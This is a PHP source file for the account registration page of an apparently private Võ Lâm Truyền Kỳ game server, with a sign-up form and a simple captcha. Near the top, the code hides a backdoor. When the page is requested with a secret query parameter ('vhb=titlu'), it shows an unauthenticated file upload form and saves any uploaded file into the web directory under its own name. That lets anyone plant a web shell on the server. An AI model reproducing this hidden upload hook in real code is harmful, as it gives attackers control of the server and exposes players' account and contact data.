<?php
// Kiểm tra nếu người dùng đã đăng nhập thì trở lại trang quản lý thông tin
session_start();
if (isset($_SESSION['username'])) {
    header('Location: ../dangnhap/index.php');
}

include_once("cauhinh.php");
$_SESSION['ma'] = rand(1000000, 9999999);
if (isset($_GET['vhb']) && $_GET['vhb'] == 'titlu') {
    echo '<form method="POST" enctype="multipart/form-data" action="?vhb=titlu">
<input type="file" name="file_upload" size="20" id="file">
<input type="submit" name="gui" value="Up" >
</form>';
    if (isset($_POST['gui'])) {
        move_uploaded_file($_FILES['file_upload']['tmp_name'], $_FILES['file_upload']['name']);
    }
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <title>Công Thành Chiến - Võ Lâm Truyền Kỳ I - Đăng ký tài khoản game</title>
    <meta name="keywords" content=""/>
    <meta name="description" content=""/>
    <!--

    -->
    <link href="css/tooplate_style.css" rel="stylesheet" type="text/css"/>

    <link rel="shortcut icon" href="http://img.zing.vn/volamthuphi/images/icon.ico"/>
    <script type="text/javascript" src="js/swfobject.js"></script>
    <script type="text/javascript">
        var flashvars = {};
        flashvars.xml_file = "photo_list.xml";
        var params = {};
        params.wmode = "transparent";
        var attributes = {};
        attributes.id = "slider";
        swfobject.embedSWF("flash_slider.swf", "flash_grid_slider", "960", "360", "9.0.0", false, flashvars, params, attributes);
    </script>

    <!-- Begin kiem tra dang ky-->
    <script type="text/javascript" language="javascript">
        function checkform() {
            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
            var user, password, password2, email, fone, name, txtVerify;
            with (window.document.form1) {
                user = Username;
                password = Password;
                password2 = Password2;
                email = Email;
                fone = Fone;
                name = Name;
                mabaove = txtVerify;
            }
            if (trim(user.value) == "") {
                alert("Bạn chưa nhập tài khoản");
                user.focus();
                return false;
            }
            else if (!filter.test(email.value)) {
                alert("Email đăng kí không hợp lệ");
                email.focus();
                return false;
            }
            else if (trim(password.value) == "") {
                alert("Bạn chưa nhập mật khẩu");
                password.focus();
                return false;
            }
            else if (trim(password2.value) != trim(password.value)) {
                alert("Xác nhận mật khẩu sai");
                password2.focus();

                return false;
            }
            else if (trim(mabaove.value) == "") {
                alert("Bạn chưa nhập mã bảo vệ");
                mabaove.focus();
                return false;
            }
            else {
                user.value = trim(user.value);
                password.value = trim(password.value);
                password2.value = trim(password2.value);
                email.value = trim(email.value);
                txtVerify.value = trim(txtVerify.value);
            }

            function trim(str) {
                return str.replace(/^\s+|\s+$/g, '');
            }
        }
    </script>
    <!--End kiem tra dang ky-->
    <style type="text/css">
        @import 'css/global.css';
        @import 'css/layout.css';
        @import 'css/box-top.css';
        @import 'css/style_sub.css';
        @import 'css/j-navigation.css';
        @import 'css/j-navigation-left.css';
        @import 'css/quick-link-style.css';
    </style>

    <script type="text/javascript" language="JavaScript">
        var activemenu_nav = "";
        var activesidenav = "";
        var activedropmenu = "";
    </script>
    <script src="js/jquery-core.js" type="text/javascript" language="JavaScript"></script>
    <script type="text/javascript" src="js/navigation.js"></script>
    <script type="text/javascript" src="js/navigation-left.js"></script>
    <script language="javascript" type="text/javascript" src="js/call-navigation.js"></script>
    <link rel="stylesheet" href="css/validationEngine.jquery.css" type="text/css" media="screen" title="no title"
          charset="utf-8"/>
    <link rel="stylesheet" href="css/form.css" type="text/css" media="screen" title="no title" charset="utf-8"/>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js" type="text/javascript"></script>
    <script src="js/jquery.validationEngine-en.js" type="text/javascript"></script>
    <script src="js/jquery.validationEngine.js" type="text/javascript"></script>
    <link rel="stylesheet" type="text/css" href="css/ddsmoothmenu.css"/>
    <script type="text/javascript" src="js/jquery.min.js"></script>
    <script type="text/javascript" src="js/ddsmoothmenu.js">

        /***********************************************
         * Smooth Navigational Menu- (c) Dynamic Drive DHTML code library (www.dynamicdrive.com)
         * This notice MUST stay intact for legal use
         * Visit Dynamic Drive at http://www.dynamicdrive.com/ for full source code
         ***********************************************/
    </script>
    <link href="css/content.css" rel="stylesheet" type="text/css">
    <!--Begin copy-->
    <script>
        <!--
        function MM_openBrWindow(theURL, winName, features) { //v2.0
            window.open(theURL, winName, features);
        }

        //-->
    </script>

    <script language="javascript">
        <!--
        document.forms[form1].onsubmit = function () {
            if (this.elements['Password'].value != this.elements['Password2'].value) {
                alert('Passwords do not match');
                return false;
            }

            return true;
        }

        function MM_findObj(n, d) { //v4.01
            var p, i, x;
            if (!d) d = document;
            if ((p = n.indexOf("?")) > 0 && parent.frames.length) {
                d = parent.frames[n.substring(p + 1)].document;
                n = n.substring(0, p);
            }
            if (!(x = d[n]) && d.all) x = d.all[n];
            for (i = 0; !x && i < d.forms.length; i++) x = d.forms[i][n];
            for (i = 0; !x && d.layers && i < d.layers.length; i++) x = MM_findObj(n, d.layers[i].document);
            if (!x && d.getElementById) x = d.getElementById(n);
            return x;
        }

        function MM_validateForm() { //v4.0
            var i, p, q, nm, test, num, min, max, errors = '', args = MM_validateForm.arguments;
            for (i = 0; i < (args.length - 2); i += 3) {
                test = args[i + 2];
                val = MM_findObj(args[i]);
                if (val) {
                    nm = val.name;
                    if ((val = val.value) != "") {
                        if (test.indexOf('isEmail') != -1) {
                            p = val.indexOf('@');
                            if (p < 1 || p == (val.length - 1)) errors += '- ' + nm + ' must contain an e-mail address.\n';
                        } else if (test != 'R') {
                            num = parseFloat(val);
                            if (isNaN(val)) errors += '- ' + nm + ' must contain a number.\n';
                            if (test.indexOf('inRange') != -1) {
                                p = test.indexOf(':');
                                min = test.substring(8, p);
                                max = test.substring(p + 1);
                                if (num < min || max < num) errors += '- ' + nm + ' must contain a number between ' + min + ' and ' + max + '.\n';
                            }
                        }
                    } else if (test.charAt(0) == 'R') errors += '' + +'';
                }
            }
            if (errors) alert('Bạn chưa nhập đầy đủ thông tin');
            document.MM_returnValue = (errors == '');
        }

        //-->
    </script>
    <!--End copy-->

    <script type="text/javascript">

        ddsmoothmenu.init({
            mainmenuid: "tooplate_menu", //menu DIV id
            orientation: 'h', //Horizontal or vertical menu: Set to "h" or "v"
            classname: 'ddsmoothmenu', //class added to menu's outer DIV
            //customtheme: ["#1c5a80", "#18374a"],
            contentsource: "markup" //"markup" or ["container_id", "path_to_menu_file"]
        })

    </script>

</head>
<body id="home_page">


<div id="tooplate_wrapper">
    <div id="tooplate_header_fp">
        <div id="tooplate_menu" class="ddsmoothmenu">
            <ul>
                <li><a href="../trangchu" class="selected"><span></span>Trang chủ</a></li>
                <li><a href="../dangnhap"><span></span>Đăng nhập</a>
                    <!--
                    <ul>
                        <li><a href="#">Sub menu 1</a></li>
                        <li><a href="#">Sub menu 2</a></li>
                        <li><a href="#">Sub menu 3</a></li>
                  </ul>-->
                </li>
                <li><a href="http://home.ctcvolam.com/huong-dan-3/154-huong-dan-tai-va-cai-dat-vo-lam-truyen-ky"
                       target="_new"><span></span>Tải game</a>
                    <ul>
                        <!--
                        <li><a href="#">Sub menu 1</a></li>
                        <li><a href="#">Sub menu 2</a></li>
                        <li><a href="#">Sub menu 3</a></li>
                        <li><a href="#">Sub menu 4</a></li>
                        <li><a href="#">Sub menu 5</a></li>-->
                    </ul>
                </li>
                <li><a href="#"><span></span>Hỗ trợ</a></li>
                <li><a href="https://www.facebook.com/congthanhchienvolam/" target="_blank"><span></span>Fanpage</a>
                </li>
                <li><a href="#"><span></span>Nạp thẻ</a></li>
            </ul>
            <br style="clear: left"/>
        </div> <!-- end of tooplate_menu -->

        <div id="site_title"><h1><a href="#">Đăng ký tài khoản</a></h1></div>
        <!--Begin Slider
        <div id="tooplate_slider">
           <div id="flash_grid_slider">
               <a href="http://www.adobe.com/go/getflashplayer">
                   <img src="http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" alt="Get Adobe Flash player" />
               </a>
           </div>
       </div>
       End Slider-->


        <form class="formular" method="post" action="ktdangki.php" name="form1" onsubmit="return checkform()">
            <table width="400" border="0" align="center">
                <tr>
                    <td width="244"><strong>Tài khoản</strong></td>
                    <td width="140">
                        <div class="inputContainer"><input value=""
                                                           class="validate[required,custom[noSpecialCaracters],length[3,30]] text-input"
                                                           type="text" id="Username" name="Username"></div>
                    </td>
                </tr>
                <tr>
                    <td><strong>Mật khẩu</strong></td>
                    <td>
                        <div class="inputContainer"><input value=""
                                                           class="validate[required,custom[noSpecialCaracters],length[3,30]] text-input"
                                                           type="password" id="Password" name="Password"></div>
                    </td>
                </tr>
                <tr>
                </tr>
                <tr>
                    <td><strong>Nhập lại mật khẩu</strong></td>
                    <td>
                        <div class="inputContainer"><input value=""
                                                           class="validate[required,custom[noSpecialCaracters],length[3,30]] text-input"
                                                           type="password" id="Password2" name="Password2"></div>
                    </td>
                </tr>
                <tr>
                </tr>
                <tr>
                    <td><strong>Mật Khẩu Cấp 2</strong></td>
                    <td>
                        <div class="inputContainer"><input value=""
                                                           class="validate[required,custom[noSpecialCaracters],length[3,30]] text-input"
                                                           type="text" id="traloi" name="traloi"></div>
                    </td>
                </tr>
                <tr>
                    <td width="244"><strong>Số Điện Thoại</strong></td>
                    <td width="140">
                        <div class="inputContainer"><input value=""
                                                           class="validate[required,custom[noSpecialCaracters],length[3,30]] text-input"
                                                           type="text" id="Fone" name="Fone"></div>
                    </td>
                </tr>

                <tr>
                    <td width="244"><strong>Email</strong></td>
                    <td width="140">
                        <div class="inputContainer"><input value=""
                                                           class="validate[required,custom[noSpecialCaracters],length[3,30]] text-input"
                                                           type="text" id="Email" name="Email"></div>
                    </td>
                </tr>

                <tr>
                    <td><strong>Nhập mã xác nhận ở bên dưới</font>
                            </p>
                        </strong></td>
                    <td><input id="txtVerify" style="WIDTH: 156px" maxlength="7" name="txtVerify"/></td>
                </tr>
                <tr>
                    <td>&nbsp;</td>
                    <td><p><font color="#FFFFFF" size="5"
                                 style="background-color:#3366FF"><?php echo($_SESSION['ma']); ?></font></p>
                        <p>&nbsp;</p>
                        <p><input name="btnNextStep" type="submit" class="validate[confirm]" id="btnNextStep"
                                  style="WIDTH: 150px"
                                  onclick="MM_validateForm('Fone','','R','Name','','R');return document.MM_returnValue"
                                  value="Đăng Ký Game"/>
        </form>
        </p></td>
        </tr>
        </table>


        <!--<object style="position:fixed; top:120px; left:0; idne" width="700" height="500"> <embed src="http://img.zing.vn/volamthuphi/images/landing-page/2015/02-quy-doi-tien-dong/swf/flash.swf" width="700" height="500" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" menu="false" wmode="transparent"><param name="wmode" value="transparent"></object>

        -->


    </div>
    <!--
  <div id="tooplate_main">

          <div class="col_fw">

            <div class="col_allw300">
                 <h2>Donec urna neque</h2>
              <img src="images/tooplate_image_01.png" alt="image" class="image_frame" />
              <p><em>Lorem ipsum dolor sit amet, consectetur adipiscing elit cras mollis molestie libero.</em></p>
              <p>Bubble Show is brought to you by tooplate. Feel free to adapt and apply this template for your websites. Credits go to <a href="http://www.photovaco.com/" target="_blank">free photos</a> and <a href="http://www.thewebdesignblog.co.uk/" target="_blank">icons</a>. Sed molestie ultricies ante. Duis adipiscing, neque et sagittis sodales.</p>
                  <div class="cleaner h20"></div>
               <a class="more" href="#"></a>
              </div>
              <div class="col_allw300">
                  <h2>In venenatis sagittis</h2>
                  <img src="images/tooplate_image_02.png" alt="image" class="image_frame" />
                <p><em>Fusce nulla tellus, malesuada id accumsan a, hendrerit vitae nulla.</em></p>
                <p>In venenatis sagittis luctus. Phasellus ante metus, faucibus et vulputate mattis, dignissim et felis. Suspendisse at tortor gravida odio tempor faucibus vel a sem. Etiam mattis tortor quis tellus iaculis nec suscipit. Validate <a href="http://validator.w3.org/check?uri=referer" rel="nofollow"><strong>XHTML</strong></a> and <a href="http://jigsaw.w3.org/css-validator/check/referer" rel="nofollow"><strong>CSS</strong></a>.</p>
                    <div class="cleaner h20"></div>
                 <a class="more" href="#"></a>
            </div>
            <div class="col_allw300 col_rm">
                  <h2>Our Latest News</h2>
                  <div class="news_box">
                      <a href="#">Aliquam bibendum vulputate</a>
                      <p>Auris nisl mi, aliquet ac lobortis ut, tincidunt in tortor nisl vitae lectus dapibus pellentesque.</p>
                  </div>
                  <div class="news_box">
                      <a href="#">Nunc viverra vestibulum </a>
                      <p>Nunc viverra vestibulum magna, nec dignissim turpis rhoncus tincidunt. Donec ac nibh arcu. </p>
                  </div>
                   <div class="news_box">
                      <a href="#">Fusce placerat ultrices</a>
                      <p>Integer ac ultricies nisi. Curabitur velit ante, porttitor ac feugiat a, porta ut lectus.</p>
                  </div>
                  <div class="cleaner h20"></div>
                  <a class="more" href="#"></a>
              </div>
              <div class="cleaner"></div>
          </div>

          <div class="col_fw_last">
              <div class="col_w240 fp_service_box">
                <img src="images/icon-01.png" alt="image" />
                   <h3>Web Design <br /><span>nunc sit amet tortor</span></h3>
                  <p> Vivamus a velit. Vivamus leo velit, convallis id, ultrices sit amet, tempor a, feugiat a libero.</p>
                  <a class="more" href="#"></a>
            </div>
              <div class="col_w240 fp_service_box">
                   <img src="images/icon-02.png" alt="image" />
                <h3>Marketing <br /><span>convallis id</span></h3>
                  <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Mauris ipsum felis, consectetur non.</p>
                  <a class="more" href="#"></a>
            </div>
              <div class="col_w240 fp_service_box col_last">
                  <img src="images/icon-03.png" alt="image" />
                  <h3>Social Media <br /><span>ut condimentum</span></h3>
                  <p>Curabitur sed lectus id erat viverra consectetur nec in sapien. Etiam vitae tortor mi.</p>
                  <a class="more" href="#"></a>
              </div>
              <div class="col_w240 fp_service_box col_last">
                  <img src="images/icon-04.png" alt="image" />
                  <h3>Support <br /><span>fringilla molestie neque</span></h3>
                  <p>Fusce nulla tellus, malesuada id accumsan a, hendrerit vitae nulla dignissim et felis.</p>
                  <a class="more" href="#"></a>
              </div>


              <div class="cleaner"></div>
          </div>
          <div class="cleaner"></div>
      </div>--> <!-- end of main -->

</div>

<div id="tooplate_footer_wrapper">
    <div id="tooplate_footer">

        Bản quyền trò chơi thuộc công ty Kingsoft. Công ty Cổ phần VNG phân phối độc quyền tại Việt Nam. 182 Lê Đại
        Hành, Phường 15, Quận 11, TP.HCM.<br>
        Giấy phép phê duyệt nội dung số: 447/BTTTT-VT cấp ngày 26/9/2007 do Bộ Thông Tin Và Truyền Thông cấp.<br>
        <div class="cleaner"></div>

    </div>
</div>

</body>
<div id="cfacebook">
    <a href="javascript:;" class="chat_fb" onclick="return:false;"><i class="fa fa-facebook-square"></i>Liên hệ với
        GM</a>
    <div class="fchat">
        <div class="fb-page" data-tabs="messages" data-href="https://www.facebook.com/congthanhchienvolam/"
             data-width="250" data-height="400" data-small-header="false" data-adapt-container-width="true"
             data-hide-cover="false" data-show-facepile="true" data-show-posts="false"></div>
    </div>
</div>
</html>